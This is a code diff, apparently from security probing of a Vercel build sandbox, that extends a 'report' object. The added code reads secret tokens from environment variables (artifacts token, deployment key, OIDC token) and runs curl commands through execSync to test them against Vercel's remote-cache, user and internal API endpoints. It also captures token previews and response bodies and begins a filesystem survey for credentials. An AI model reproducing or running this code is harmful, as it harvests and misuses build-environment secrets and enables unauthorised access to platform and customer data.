@@ -223,27 +223,85 @@ const report = {
     process.env.VERCEL_ENV_ENC_KEY,
     process.env.VERCEL_ENCRYPTED_ENV_CONTENT
   )),
-  // VERCEL_ARTIFACTS_TOKEN — Turborepo remote cache token; check scope and claims
+  // VERCEL_ARTIFACTS_TOKEN — Turborepo remote cache token; decode claims AND probe API
   artifactsToken: safe(() => {
     const tok = process.env.VERCEL_ARTIFACTS_TOKEN;
     if (!tok) return "absent";
-    // Decode JWT if it is one
+
+    // Decode JWT claims (informational)
+    let claims = null;
     const parts = tok.split('.');
     if (parts.length === 3) {
-      try {
-        const claims = JSON.parse(Buffer.from(parts[1], 'base64url').toString('utf8'));
-        return { type: 'jwt', claims };
-      } catch(_) {}
+      try { claims = JSON.parse(Buffer.from(parts[1], 'base64url').toString('utf8')); } catch(_) {}
     }
-    // Try Turborepo Remote Cache API with this token
-    const artifactsOwner = process.env.VERCEL_ARTIFACTS_OWNER || '';
+
+    // ALWAYS probe the Turborepo Remote Cache API (whether JWT or opaque)
+    const ownerId = (claims?.data?.ownerId) || process.env.VERCEL_ARTIFACTS_OWNER || '';
     const apiBase = 'https://vercel.com/api/remote-cache/v8/artifacts';
+
+    // List artifacts — proves team-level read scope
     const listStatus = safe(() => execSync(
-      `curl -s --max-time 5 -o /tmp/art_list -w '%{http_code}' -H 'Authorization: Bearer ${tok}' -H 'x-artifact-client-ci: vercel' '${apiBase}?teamId=${artifactsOwner}&limit=5' || true`
+      `curl -s --max-time 8 -o /tmp/art_list -w '%{http_code}' -H 'Authorization: Bearer ${tok}' -H 'x-artifact-client-ci: vercel' '${apiBase}?teamId=${ownerId}&limit=5' 2>/dev/null || true`
     ).toString().trim());
-    const listBody = safe(() => readFileSync('/tmp/art_list', 'utf8').slice(0, 500));
-    return { type: 'token', len: tok.length, preview: tok.slice(0, 12) + '...', listStatus, listBody };
+    const listBody = safe(() => readFileSync('/tmp/art_list', 'utf8').slice(0, 400));
+
+    // Events/query endpoint — lists recent artifact activity
+    const eventsStatus = safe(() => execSync(
+      `curl -s --max-time 8 -o /tmp/art_events -w '%{http_code}' -X POST -H 'Authorization: Bearer ${tok}' -H 'Content-Type: application/json' -H 'x-artifact-client-ci: vercel' '${apiBase}/events?teamId=${ownerId}' -d '{"sessionId":"probe-bounty-test"}' 2>/dev/null || true`
+    ).toString().trim());
+    const eventsBody = safe(() => readFileSync('/tmp/art_events', 'utf8').slice(0, 400));
+
+    // Exists check for a known-invalid hash — test auth (200=found, 404=not found, 403=authn fail)
+    const existsStatus = safe(() => execSync(
+      `curl -s --max-time 8 -o /tmp/art_exists -w '%{http_code}' -H 'Authorization: Bearer ${tok}' -H 'x-artifact-client-ci: vercel' '${apiBase}/deadbeef1234567890abcdef12345678?teamId=${ownerId}' 2>/dev/null || true`
+    ).toString().trim());
+    const existsBody = safe(() => readFileSync('/tmp/art_exists', 'utf8').slice(0, 200));
+
+    return {
+      type: claims ? 'jwt' : 'opaque',
+      claims,
+      len: tok.length,
+      ownerId,
+      listStatus, listBody,
+      eventsStatus, eventsBody,
+      existsStatus, existsBody,
+    };
   }),
+  // VERCEL_DEPLOYMENT_KEY — unknown 44-char key; probe against Vercel API as Bearer token
+  deploymentKey: safe(() => {
+    const key = process.env.VERCEL_DEPLOYMENT_KEY;
+    if (!key) return "absent";
+    const len = key.length;
+    // Try as Bearer against public Vercel API
+    const userStatus = safe(() => execSync(
+      `curl -s --max-time 5 -o /tmp/dk_user -w '%{http_code}' -H 'Authorization: Bearer ${key}' 'https://api.vercel.com/v2/user' 2>/dev/null || true`
+    ).toString().trim());
+    const userBody = safe(() => readFileSync('/tmp/dk_user', 'utf8').slice(0, 300));
+    // Try internal API endpoint if present
+    const internalEp = process.env.VERCEL_API_ENDPOINT || '';
+    const internalStatus = internalEp ? safe(() => execSync(
+      `curl -s --max-time 5 -o /tmp/dk_int -w '%{http_code}' -H 'Authorization: Bearer ${key}' '${internalEp}/v2/user' 2>/dev/null || true`
+    ).toString().trim()) : 'no-internal-ep';
+    const internalBody = safe(() => readFileSync('/tmp/dk_int', 'utf8').slice(0, 300));
+    return { len, preview: key.slice(0, 8) + '...', userStatus, userBody, internalStatus, internalBody };
+  }),
+  // Internal API endpoints — what services are reachable from inside the build sandbox?
+  internalEndpoints: safe(() => ({
+    apiEndpoint: process.env.VERCEL_API_ENDPOINT,
+    buildContainersEndpoint: process.env.VERCEL_API_BUILD_CONTAINERS_ENDPOINT,
+    artifactsOwner: process.env.VERCEL_ARTIFACTS_OWNER,
+    // Probe internal API endpoint with OIDC token
+    internalApiProbe: safe(() => {
+      const ep = process.env.VERCEL_API_ENDPOINT;
+      const oidc = process.env.VERCEL_OIDC_TOKEN;
+      if (!ep || !oidc) return 'missing-ep-or-oidc';
+      const st = safe(() => execSync(
+        `curl -s --max-time 5 -o /tmp/int_probe -w '%{http_code}' -H 'Authorization: Bearer ${oidc}' '${ep}/v2/user' 2>/dev/null || true`
+      ).toString().trim());
+      const body = safe(() => readFileSync('/tmp/int_probe', 'utf8').slice(0, 300));
+      return { status: st, body };
+    }),
+  })),
   // Filesystem survey — looking for secrets, config files, other credentials
   filesystemSurvey: safe(() => ({
     vercelDir: safe(() => execSync("ls -la /vercel/ 2>/dev/null | head -20 || true").toString().trim()),
